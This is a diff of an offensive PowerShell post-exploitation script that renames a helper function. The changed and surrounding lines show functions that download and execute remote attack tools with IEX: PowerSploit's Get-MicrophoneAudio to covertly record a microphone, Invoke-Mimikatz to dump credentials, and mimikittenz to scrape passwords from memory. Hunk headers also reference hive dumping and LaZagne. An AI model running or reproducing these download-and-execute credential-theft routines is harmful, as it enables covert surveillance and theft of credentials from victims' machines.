@@ -4,8 +4,8 @@ function Download ($url, $filename)
    (New-Object System.Net.WebClient).DownloadFile($url, $filename)
 }
 
-#DownloadString -url "http://example.com/a.ps1" 
-function DownloadString($url)
+#DownloadScript -url "http://example.com/a.ps1" 
+function DownloadScript($url)
 {
     (New-Object System.Net.WebClient).DownloadString($url);
 }
@@ -38,7 +38,7 @@ function DumpHives($dumpfolder)
 #RunVoiceRecord -fullPathOutput "C:\windows\temp\secret.wav" -seconds 120
 function RunVoiceRecord($fullPathOutput, $seconds)
 {
-    IEX (DownloadString -url "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1");
+    IEX (DownloadScript -url "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1");
     Get-MicrophoneAudio -Path $fullPathOutput -Length $seconds -Alias "top_secret";
 }
 
@@ -69,13 +69,13 @@ function RunLazagne()
 #RunMimikatz
 function RunMimikatz()
 {
-    IEX (DownloadString -url "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1");
+    IEX (DownloadScript -url "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1");
     Invoke-Mimikatz -DumpCreds;
 }
 
 #RunMimikittenz
 function RunMimikittenz()
 {
-    IEX (DownloadString -url "https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1");
+    IEX (DownloadScript -url "https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1");
     Invoke-mimikittenz;
 }
